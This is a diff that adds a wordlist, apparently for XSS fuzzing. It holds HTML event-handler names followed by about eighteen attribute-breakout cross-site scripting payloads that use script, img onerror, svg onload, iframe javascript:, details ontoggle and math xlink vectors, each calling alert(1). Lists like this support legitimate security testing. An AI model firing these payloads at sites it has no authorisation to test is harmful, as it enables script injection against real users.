@@ -1,0 +1,77 @@
+onbeforeload
+onBeforeUnload
+onbegin
+onBlur
+onchange
+onchrome
+onclick
+oncontextmenu
+oncopy
+oncut
+ondblclick
+ondrag
+onEnd
+oneNode
+onerror
+onfilterchange
+onfinish
+onfocus
+onformchange
+onforminput
+onhashchange
+onhelp
+oninput
+onkeydown
+onkeypress
+onkeyup
+onload
+onloadstart
+onlypossibleinopera
+onMouseDown
+onMouseEnter
+onMouseLeave
+onMouseMove
+onMouseOut
+onmouseover
+onMouseUp
+onMouseWheel
+onorientationchange
+onPageHide
+onPageShow
+onpaste
+onPopState
+onPropertyChange
+onqt_error
+onreadystatechange
+onResize
+onScroll
+onseText
+onshow
+onStart
+onsubmit
+onToGgle
+ontouchcancel
+ontouchend
+ontouchmove
+ontouchstart
+ontype
+onUnload
+onxxx
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+"><iframe src=javascript:alert(1)></iframe>
+'<iframe src=javascript:alert(1)></iframe>
+"><details open ontoggle=alert(1)>
+'<details open ontoggle=alert(1)>
+"><input autofocus onfocus=alert(1)>
+'<input autofocus onfocus=alert(1)>
+"><video><source onerror="alert(1)">
+'<video><source onerror="alert(1)">
+"><math><mi//xlink:href="data:x,<script>alert(1)</script>">
+'<math><mi//xlink:href="data:x,<script>alert(1)</script>">
